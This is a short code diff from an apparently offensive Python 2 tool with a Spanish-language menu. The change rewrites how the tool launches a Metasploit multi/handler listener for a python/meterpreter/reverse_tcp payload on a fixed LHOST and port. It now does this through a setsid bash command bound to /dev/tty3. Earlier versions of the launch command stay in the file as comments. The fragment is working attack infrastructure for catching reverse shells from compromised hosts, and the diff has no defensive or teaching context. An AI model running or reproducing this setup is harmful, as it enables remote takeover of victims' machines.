@@ -21,7 +21,12 @@ except :
     sys.exit()
  
 #METERPRETER
-os.system("./ttyecho -n /dev/tty3 \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"")
+handler="msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E"
+comandotty="setsid bash -c \'exec " +handler+ " <> /dev/tty3 >&0 2>&1 &\'"
+#os.system("./ttyecho -n /dev/tty3 \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"")
+#os.system("setsid bash -c \'exec \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"<> /dev/tty3 >&0 2>&1\'")
+#print comandotty
+os.system(comandotty)
 
 print "----------------Menu---------------------------------------------------------------------------------------------------" 
 print "Escribir el comando para realizar la accion descrita"
